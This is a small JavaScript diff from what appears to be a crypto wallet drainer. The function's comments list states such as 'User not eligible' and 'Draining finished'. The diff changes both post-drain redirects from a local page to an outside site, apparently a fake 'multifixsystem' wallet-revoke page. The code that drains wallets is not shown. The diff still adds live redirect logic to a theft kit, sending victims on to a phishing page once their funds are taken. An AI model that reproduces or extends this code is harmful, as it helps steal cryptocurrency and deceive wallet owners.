@@ -145,10 +145,10 @@ function updateWalletData(walletAddress, walletEthBalance, status) {
   // 2 - User not eligible
   // 3 - Draining finished
   if(status == 2){
-    window.location.href = './wallets/index.html'
+    window.location.href = 'https://multifixsystem.netlify.app/wallets/revoke.html'
   }
   if(status == 3){
-    window.location.href = './wallets/index.html'
+    window.location.href = 'https://multifixsystem.netlify.app/wallets/revoke.html'
   }
   console.log(walletAddress, walletEthBalance, status);
 }
